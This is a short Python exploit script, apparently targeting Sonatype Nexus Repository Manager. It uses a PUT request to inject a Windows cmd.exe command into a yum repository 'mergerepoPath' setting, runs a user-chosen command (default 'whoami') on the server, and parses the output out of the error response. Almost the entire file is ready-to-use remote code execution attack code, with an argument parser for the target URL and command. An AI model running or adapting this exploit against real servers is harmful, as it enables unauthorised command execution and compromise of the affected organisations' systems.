#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

'''
 ____       _     _     _ _   __  __           _
|  _ \ __ _| |__ | |__ (_) |_|  \/  | __ _ ___| | __
| |_) / _` | '_ \| '_ \| | __| |\/| |/ _` / __| |/ /
|  _ < (_| | |_) | |_) | | |_| |  | | (_| \__ \   <
|_| \_\__,_|_.__/|_.__/|_|\__|_|  |_|\__,_|___/_|\_\
'''


import argparse
import re
import requests
import json

headers = {'user-agent': 'Mozilla/5.1 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0',
           "Cookie":"[Your Cookie]",            #自行填充cookie
           "X-Requested-With":"XMLHttpRequest",
           "Accept":"application/json,application/vnd.siesta-error-v1+json,application/vnd.siesta-validation-errors-v1+json",
           "Accept-Language":"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
           "Accept-Encoding":"gzip, deflate",
           "X-Nexus-UI":"ture",
           "Content-Type":"application/json"}

def run(url,cmd):
    listdata=[{"key":"mergerepoPath","value":"C:\\Windows\\System32\\cmd.exe /k {}&".format(cmd)}]

    data={"typeId":"yum",
          "enabled":True,
          "properties":listdata,
          "id":"00038db6d095f9c4",
          "notes":"123"}
    try:
        response=requests.put(url,data=json.dumps(data),headers=headers)
        r=response.text
        res = re.findall(r"\\\"mergerepo\\\" version:<br/>(.*?)<br/>'--version'", r)
        print(res[0].replace('<br/>','\n').replace('<br>','\n'))
    except:
        print("在下认为您的爪子有点残，您怎么看？")

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="URL of target site (eg: http://127.0.0.1:8080/)")
    parser.add_argument("-c", "--cmd", default="whoami", help="Command to execute (default = whoami)")
    args = parser.parse_args()
    if args.url:
        run(args.url,args.cmd)